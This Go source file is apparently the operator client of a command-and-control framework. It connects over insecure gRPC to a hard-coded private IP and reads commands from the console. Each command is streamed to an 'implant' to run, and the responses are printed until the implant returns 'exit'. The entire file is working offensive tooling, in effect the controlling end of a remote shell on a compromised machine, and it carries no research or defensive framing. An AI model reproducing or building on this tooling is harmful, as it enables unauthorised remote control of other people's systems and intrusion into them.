package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"os"
	"strings"
	"sync"

	pb "github.com/bartimus-primed/proto/pb"
	"google.golang.org/grpc"
)

const (
	address     = "192.168.253.132:50551"
	defaultName = "client0"
)

var recv bool = false
var shouldExit bool = false

func main() {
	conn, err := grpc.Dial(address, grpc.WithInsecure())
	if err != nil {
		log.Fatalf("did not connect: %v", err)
	}
	defer conn.Close()
	c := pb.NewInteractClient(conn)

	stream, err := c.HandsOn(context.Background())
	if err != nil {
		panic(err.Error())
	}
	var waitgroup sync.WaitGroup
	command_buff := bufio.NewReader(os.Stdin)
	command_to_run := ""
	go func() {
		for {
			resp, _ := stream.Recv()
			if resp.Resp != "" {
				fmt.Println("\nReceived: ", resp.GetResp())
				if resp.GetResp() == "exit" {
					shouldExit = true
					conn.Close()
				}
			}
			waitgroup.Done()
			recv = true
		}
	}()
	for !shouldExit {
		fmt.Print("Enter command to run on implant: ")
		recv = false
		cmd_input, _ := command_buff.ReadString('\n')
		command_to_run = strings.Replace(cmd_input, "\n", "", -1)
		command_to_run = strings.TrimSpace(command_to_run)
		fmt.Println(fmt.Sprintln(command_to_run))
		cmd := &pb.Command{
			Cmd:      fmt.Sprintln(command_to_run),
			Timeout:  5,
			SendResp: true,
		}
		waitgroup.Add(1)
		stream.Send(cmd)
		waitgroup.Wait()
	}
	stream.CloseSend()
}
